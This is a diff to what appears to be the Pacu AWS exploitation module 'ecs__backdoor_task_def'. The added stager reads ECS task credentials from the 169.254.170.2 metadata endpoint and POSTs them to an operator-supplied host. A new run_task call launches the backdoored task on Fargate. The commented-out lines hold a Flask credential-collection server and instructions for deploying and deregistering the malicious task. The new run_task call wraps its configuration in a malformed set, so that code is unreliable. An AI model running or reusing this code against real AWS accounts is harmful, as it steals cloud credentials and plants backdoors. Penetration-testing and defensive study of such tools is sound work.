@@ -91,14 +91,10 @@ def main(args, pacu_main):
 		task_def = client.describe_task_definition(
 			taskDefinition=task_definition
 		)
-		#container_image = task_def["taskDefinition"]["containerDefinitions"][0]["image"]
-		
-		#docker_client = docker.from_env()
-		#cont = docker_client.containers.run(container_image,"/bin/sh",detach=True,tty=True,remove=True)
-
+	
 		lhost = input("    Enter an IP / Domain to host payload/receive credentials: ")
 		lport = input("    Enter a port to host the application to receive credentials: ")
-		stager = ['curl http://'+lhost+':'+lport+'/'+' | sh']			
+		stager = ['/bin/sh -c \\"curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json\\" http://{}:{}'.format(lhost,lport)]			
 
 		task_def_keys = [x for x in task_def['taskDefinition'].keys()]
 		temp = task_def['taskDefinition']
@@ -133,28 +129,32 @@ def main(args, pacu_main):
 			memory=temp['memory'] if 'memory' in task_def_keys else '512'
 		)
 
-		with open('./sessions/{}/downloads/ecs__backdoor_task_def/{}'.format(session.name,payload_shell_script_name),'w') as f:
-			f.write('#!/bin/sh\n\necs_uri=$(echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)\n\ncurl http://169.254.170.2$ecs_uri -o meta.txt\n\ncurl http://{}:{}/post -d "id=$(cat meta.txt)"'.format(lhost,lport))
+		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/{}'.format(session.name,payload_shell_script_name),'w') as f:
+			#f.write('#!/bin/sh\n\necs_uri=$(echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)\n\ncurl http://169.254.170.2$ecs_uri -o meta.txt\n\ncurl http://{}:{}/post -d "id=$(cat meta.txt)"'.format(lhost,lport))
 		
 		current_revision = resp['taskDefinition']['taskDefinitionArn']
 
 		subnet = input("    Input subnet ID to run the task definition: ")
 		security_group = input("    Input the secuirty group to use: ")
+
+		client.run_task(cluster=cluster,launchType="FARGATE",networkConfiguration={
+			{"awsvpcConfiguration":{"subnets":[subnet],"securityGroups":[security_group],"assignPublicIp":"ENABLED"}}
+		})
 		
-		print("    Creating necessary files...")
-		with open('./sessions/{}/downloads/ecs__backdoor_task_def/requirements.txt'.format(session.name),'w') as f:
-			f.write("Flask==1.1.1")
-		with open('./sessions/{}/downloads/ecs__backdoor_task_def/app.py'.format(session.name),'w') as f:
-			f.write('#!/usr/bin/python3\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\n@app.route("/")\ndef deliver_payload():\n\twith open("'+payload_shell_script_name+'","r") as f:\n\t\t'+
-				'script=f.read()\n\treturn script\n\n@app.route("/post",methods=["POST"])\ndef post():\n\tdata=json.loads(request.form.get("id"))\n\tdata["Token"] = data["Token"].replace(" ","+")' +
-				'\n\twith open("credentials.txt","a") as f:\n\t\tf.write(json.dumps(data))\n\treturn \'\'\n\nif __name__ == "__main__":\n\tapp.run(host="0.0.0.0",port='+lport+')')
-		with open('./sessions/{}/downloads/ecs__backdoor_task_def/run.sh'.format(session.name),'w') as f:
-			f.write('#!/bin/sh\n\nsudo pip3 install -r requirements.txt\n\npython3 app.py')
-		with open('./sessions/{}/downloads/ecs__backdoor_task_def/instructions.txt'.format(session.name),'w') as f:
-			f.write('To run the malicious task definition follow the instructions below...\n\n1) Place app.py, run.sh, and '+payload_shell_script_name+' in the same directory\n\n2) Run run.sh to install flask and to start the app\n\n' +
-				'3) Run the following command to start the task definition: aws ecs run-task --task-definition '+current_revision+' --cluster '+cluster+' --launch-type FARGATE'+
-				' --network-configuration \'{"awsvpcConfiguration":{"subnets":["'+subnet+'"],"securityGroups":["'+security_group+'"],"assignPublicIp":"ENABLED"}}\''+
-				'\n\n4) Deregister the malicious task definition with the following command: aws ecs deregister-task-definition --task-definition '+current_revision+'\n')
+		#print("    Creating necessary files...")
+		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/requirements.txt'.format(session.name),'w') as f:
+		#	f.write("Flask==1.1.1")
+		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/app.py'.format(session.name),'w') as f:
+		#	f.write('#!/usr/bin/python3\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\n@app.route("/")\ndef deliver_payload():\n\twith open("'+payload_shell_script_name+'","r") as f:\n\t\t'+
+		#		'script=f.read()\n\treturn script\n\n@app.route("/post",methods=["POST"])\ndef post():\n\tdata=json.loads(request.form.get("id"))\n\tdata["Token"] = data["Token"].replace(" ","+")' +
+		#		'\n\twith open("credentials.txt","a") as f:\n\t\tf.write(json.dumps(data))\n\treturn \'\'\n\nif __name__ == "__main__":\n\tapp.run(host="0.0.0.0",port='+lport+')')
+		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/run.sh'.format(session.name),'w') as f:
+		#	f.write('#!/bin/sh\n\nsudo pip3 install -r requirements.txt\n\npython3 app.py')
+		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/instructions.txt'.format(session.name),'w') as f:
+		#	f.write('To run the malicious task definition follow the instructions below...\n\n1) Place app.py, run.sh, and '+payload_shell_script_name+' in the same directory\n\n2) Run run.sh to install flask and to start the app\n\n' +
+		#		'3) Run the following command to start the task definition: aws ecs run-task --task-definition '+current_revision+' --cluster '+cluster+' --launch-type FARGATE'+
+		#		' --network-configuration \'{"awsvpcConfiguration":{"subnets":["'+subnet+'"],"securityGroups":["'+security_group+'"],"assignPublicIp":"ENABLED"}}\''+
+		#		'\n\n4) Deregister the malicious task definition with the following command: aws ecs deregister-task-definition --task-definition '+current_revision+'\n')
 	else:
 		print("    A task definition must be specified")
 		return None
